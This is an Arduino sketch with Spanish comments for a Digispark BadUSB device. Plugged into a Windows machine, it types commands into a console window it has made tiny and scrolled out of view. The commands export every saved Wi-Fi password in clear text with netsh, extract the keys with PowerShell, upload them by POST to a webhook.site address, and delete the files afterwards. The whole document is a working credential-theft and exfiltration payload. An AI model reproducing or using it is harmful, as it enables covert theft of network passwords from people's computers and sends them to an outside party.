#include <DigiKeyboard.h>

#define KEY_DOWN 0x51 // ScanCode con la dirección hacia abajo (trabajamos con pulsaciones de teclas)

void setup()
{
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(3000);

    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Run (Win+R)
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); // Abrimos la consola lo más pequeño posible
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_M); // Bajamos la ventana (attach scrolling)
    for(int i = 0; i < 100; i++)
    {
        DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Detach del scrolling
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cd %temp%"); // Vamos a un directorio temporal
    DigiKeyboard.delay(500);
    DigiKeyboard.println("netsh wlan export profile key=clear"); // Exportamos el archivo a un xml
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); // Extraemos las contraseñas del xml y las guardamos en un archivo Wi-Fi-PASS
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/85c81415-5eda-49b0-951b-b970a042029a -Method POST -InFile Wi-Fi-PASS"); // Subimos todo a nuestro hook
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("del Wi-Fi* /s /f /q"); // Limpiamos antes de salir
    DigiKeyboard.delay(500);
    DigiKeyboard.println("exit");
    DigiKeyboard.delay(100);
}

void loop() { /*empty*/ }
